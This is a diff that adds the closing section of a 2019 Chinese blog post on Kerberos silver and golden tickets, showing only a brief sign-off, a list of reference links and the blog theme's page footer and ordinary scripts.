+<p>直接无障碍，域内随便访问了。。。。。</p>
+<p>不搞了，不搞了。。。太菜了。。。</p>
+<p><strong>0x07 参考文章</strong></p>
+<p>[1]<a target="_blank" rel="noopener" href="https://vonjk.red/2019/02/04/kerberos-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/">https://vonjk.red/2019/02/04/kerberos-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</a><br>[2]<a target="_blank" rel="noopener" href="https://sakuxa.com/2019/04/03/02-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BKerberos/">https://sakuxa.com/2019/04/03/02-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BKerberos/</a><br>[3]<a target="_blank" rel="noopener" href="http://1ypt0.top/2019/04/21/%E8%AE%A4%E8%AF%81%E7%90%90%E7%A2%8E/">http://1ypt0.top/2019/04/21/%E8%AE%A4%E8%AF%81%E7%90%90%E7%A2%8E/</a><br>[4]<a target="_blank" rel="noopener" href="https://www.tttang.com/archive/974/">https://www.tttang.com/archive/974/</a><br>[5]<a target="_blank" rel="noopener" href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/?tdsourcetag=s_pcqq_aiomsg">https://klionsec.github.io/2016/08/10/ntlm-kerberos/?tdsourcetag=s_pcqq_aiomsg</a><br>[6]<a target="_blank" rel="noopener" href="https://blog.csdn.net/include_heqile/article/details/88663612">https://blog.csdn.net/include_heqile/article/details/88663612</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" class="print-no-link">#域渗透</a>
+      
+        <a href="/tags/Kerberos%E8%AE%A4%E8%AF%81/" class="print-no-link">#Kerberos认证</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>白银票据与黄金票据探究</div>
+      <div>https://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2019年6月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/06/09/Windows-Access-Token-Security-Exploration/" title="Windows访问令牌安全探究">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Windows访问令牌安全探究</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/05/19/Hash-Passing-Attack-explore/" title="hash传递攻击研究">
+                        <span class="hidden-mobile">hash传递攻击研究</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
